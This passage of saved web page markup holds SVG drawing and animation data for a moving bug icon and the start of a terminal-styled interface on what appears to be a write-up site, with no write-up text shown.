d="M220.774,403.471c-62.815-37.555-58.198-88.343-58.198-88.343v-115.076h183.9v115.076c0,0,4.617,50.788-58.198,88.343l-.269-1.022v-58.76l20.108-16.434v-32.545c7.793-2.587,13.421-9.94,13.421-18.598c0-10.814-8.779-19.592-19.592-19.592s-19.592,8.778-19.592,19.592c0,8.847,5.877,16.332,13.937,18.762v27.052l-19.775,17.268v70.735c-5.044,2.543-10.45,5-16.243,7.348v-87.247c8.012-2.459,13.845-9.921,13.845-18.735c0-10.813-8.779-19.592-19.592-19.592s-19.592,8.779-19.592,19.592c0,8.814,5.833,16.276,13.846,18.735v87.247l-.158-.064c-2.771-1.127-5.522-2.304-8.247-3.538-2.593-1.174-5.161-2.401-7.704-3.679l-.135-.067v-63.735l-19.775-14.268v-20.792c7.541-2.726,12.937-9.953,12.937-18.431c0-10.813-8.779-19.591-19.592-19.591s-19.592,8.778-19.592,19.591c0,8.658,5.628,16.012,13.421,18.599v25.953l21.109,14.434v50.76l-.27,1.022Zm33.752-101.852c5.341,0,9.676,4.336,9.676,9.676c0,5.341-4.335,9.677-9.676,9.677-5.34,0-9.676-4.336-9.676-9.677c0-5.34,4.336-9.676,9.676-9.676Zm-48.42-18.592c5.34,0,9.676,4.336,9.676,9.676c0,5.341-4.336,9.677-9.676,9.677-5.341,0-9.676-4.336-9.676-9.677c0-5.34,4.335-9.676,9.676-9.676Zm95.84-16.592c5.341,0,9.677,4.336,9.677,9.677c0,5.34-4.336,9.676-9.677,9.676-5.34,0-9.676-4.336-9.676-9.676c0-5.341,4.336-9.677,9.676-9.677Z" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g><g transform="translate(-73.5169-38.4886)" clip-rule="evenodd"><g transform="matrix(-.909773 0 0 1 493.319 0)" clip-rule="evenodd"><path d="M166.979,225.446c0-.889-.794-1.612-1.772-1.612h-28.799c-5.068,0-9.183,3.744-9.183,8.354c0,4.611,4.115,8.354,9.183,8.354h28.799c.978,0,1.772-.722,1.772-1.611v-13.485Z" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g><g transform="matrix(-.866025-.5-.5 0.866025 609.497791 100.975794)" clip-rule="evenodd"><g id="evygBKlPSqr13_tr" transform="translate(139.737,232.188) rotate(0)"><path d="M139.737,232.188c0-4.61-3.743-8.354-8.354-8.354h-42.772c-4.611,0-8.354,3.744-8.354,8.354c0,4.611,3.743,8.354,8.354,8.354h42.772c4.611,0,8.354-3.743,8.354-8.354Z" transform="translate(-139.737,-232.188)" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g></g></g><g transform="translate(-73.5169-38.4886)" clip-rule="evenodd"><g transform="matrix(-1 0 0 1 508.385 41.2501)" clip-rule="evenodd"><path d="M166.979,225.446c0-.889-.722-1.612-1.612-1.612h-29.788c-4.611,0-8.354,3.744-8.354,8.354c0,4.611,3.743,8.354,8.354,8.354h29.788c.89,0,1.612-.722,1.612-1.611v-13.485Z" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g><g transform="matrix(-.707107 0.707107 0.707107 0.707107 310.015271 10.447407)" clip-rule="evenodd"><g id="evygBKlPSqr18_tr" transform="translate(139.737,232.188) rotate(0)"><path d="M139.737,232.188c0-4.61-3.743-8.354-8.354-8.354h-42.772c-4.611,0-8.354,3.744-8.354,8.354c0,4.611,3.743,8.354,8.354,8.354h42.772c4.611,0,8.354-3.743,8.354-8.354Z" transform="translate(-139.737,-232.188)" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g></g></g><g transform="translate(-73.5169-38.4886)" clip-rule="evenodd"><g transform="matrix(-1 0 0 1 508.385 92.3776)" clip-rule="evenodd"><path d="M166.979,225.446c0-.889-.722-1.612-1.612-1.612h-29.788c-4.611,0-8.354,3.744-8.354,8.354c0,4.611,3.743,8.354,8.354,8.354h29.788c.89,0,1.612-.722,1.612-1.611v-13.485Z" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g><g transform="matrix(0 1.06393 1 0 140.199 180.854)" clip-rule="evenodd"><path d="M166.979,232.188c0-4.61-3.519-8.354-7.852-8.354h-24.05c-4.334,0-7.852,3.744-7.852,8.354c0,4.611,3.518,8.354,7.852,8.354h24.05c4.333,0,7.852-3.743,7.852-8.354Z" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g><g transform="matrix(-.866025-.5-.5 0.866025 609.497658 221.785295)" clip-rule="evenodd"><g id="evygBKlPSqr25_tr" transform="translate(139.73775,232.188433) rotate(0)"><path d="M139.737,232.188c0-4.61-3.743-8.354-8.354-8.354h-42.772c-4.611,0-8.354,3.744-8.354,8.354c0,4.611,3.743,8.354,8.354,8.354h42.772c4.611,0,8.354-3.743,8.354-8.354Z" transform="translate(-139.73775,-232.188433)" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g></g></g><g transform="translate(-73.5169-38.4886)" clip-rule="evenodd"><g transform="matrix(.909773 0 0 1 15.066 0)" clip-rule="evenodd"><path d="M166.979,225.446c0-.889-.794-1.612-1.772-1.612h-28.799c-5.068,0-9.183,3.744-9.183,8.354c0,4.611,4.115,8.354,9.183,8.354h28.799c.978,0,1.772-.722,1.772-1.611v-13.485Z" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g><g transform="translate(-3.73987 0)" clip-rule="evenodd"><g id="evygBKlPSqr30_tr" transform="translate(139.737,232.188) rotate(45)"><path d="M139.737,232.188c0-4.61-3.743-8.354-8.354-8.354h-42.772c-4.611,0-8.354,3.744-8.354,8.354c0,4.611,3.743,8.354,8.354,8.354h42.772c4.611,0,8.354-3.743,8.354-8.354Z" transform="translate(-139.737,-232.188)" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g></g></g><g transform="translate(-73.5169-38.4886)" clip-rule="evenodd"><g transform="translate(0 41.2501)" clip-rule="evenodd"><path d="M166.979,225.446c0-.889-.722-1.612-1.612-1.612h-29.788c-4.611,0-8.354,3.744-8.354,8.354c0,4.611,3.743,8.354,8.354,8.354h29.788c.89,0,1.612-.722,1.612-1.611v-13.485Z" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g><g transform="matrix(.866025-.5 0.5 0.866025-104.112656 142.225892)" clip-rule="evenodd"><g id="evygBKlPSqr35_tr" transform="translate(139.737,232.188) rotate(0)"><path d="M139.737,232.188c0-4.61-3.743-8.354-8.354-8.354h-42.772c-4.611,0-8.354,3.744-8.354,8.354c0,4.611,3.743,8.354,8.354,8.354h42.772c4.611,0,8.354-3.743,8.354-8.354Z" transform="translate(-139.737,-232.188)" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g></g></g><g transform="translate(-73.5169-38.4886)" clip-rule="evenodd"><g transform="translate(0 92.3776)" clip-rule="evenodd"><path d="M166.979,225.446c0-.889-.722-1.612-1.612-1.612h-29.788c-4.611,0-8.354,3.744-8.354,8.354c0,4.611,3.743,8.354,8.354,8.354h29.788c.89,0,1.612-.722,1.612-1.611v-13.485Z" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g><g transform="matrix(0 1.06393-1 0 368.186 180.854)" clip-rule="evenodd"><path d="M166.979,232.188c0-4.61-3.519-8.354-7.852-8.354h-24.05c-4.334,0-7.852,3.744-7.852,8.354c0,4.611,3.518,8.354,7.852,8.354h24.05c4.333,0,7.852-3.743,7.852-8.354Z" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g><g transform="translate(-3.73987 120.809)" clip-rule="evenodd"><g id="evygBKlPSqr42_tr" transform="translate(139.737,232.188) rotate(30)"><path d="M139.737,232.188c0-4.61-3.743-8.354-8.354-8.354h-42.772c-4.611,0-8.354,3.744-8.354,8.354c0,4.611,3.743,8.354,8.354,8.354h42.772c4.611,0,8.354-3.743,8.354-8.354Z" transform="translate(-139.736996,-232.188)" clip-rule="evenodd" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="1.5"></path></g></g></g></g><rect id="bug-rect" x="0" width="362" height="380"></rect></g></g><animateMotion dur="30s" repeatCount="indefinite" rotate="auto-reverse" path="M -500 -500 M 500 -500 M -500 500 M 638 646 C 244 99 294 251 237 -148 C 229 -325 -43 -261 -138 -205 C -455 -57 -374 404 64 339 C 355 327 290 -273 -109 -143 C -336 -66 -356 16 -378 106 C -413 252 -319 649 -5 451 C 293 243 -326 155 -145 -36 C -45 -124 431 60 144 222 C -149 368 -258 13 17 -110 C 325 -218 203 200 34 181 C -419 161 37 637 635 649"></animateMotion></g></g></svg></div><!--]--></div></div><div class="cli-container" data-v-3d677fb4="" data-v-159c5976=""><div class="cli-output glow-border" data-v-159c5976="" data-v-3fc3914e=""><button class="close-output-btn glow-border" data-v-3fc3914e=""><img src="N-less%20RSA%20TheStray%CF%80rate_files/close_output.svg" alt="v" data-v-3fc3914e=""></button><div class="output-content hide-content" data-v-3fc3914e=""><span data-v-3fc3914e="">/writeups/ $ </span></div></div><div class="cli-prompt glow-border" data-v-159c5976=""><p data-v-159c5976="">
                 <span style="color: indianred;">root@</span>
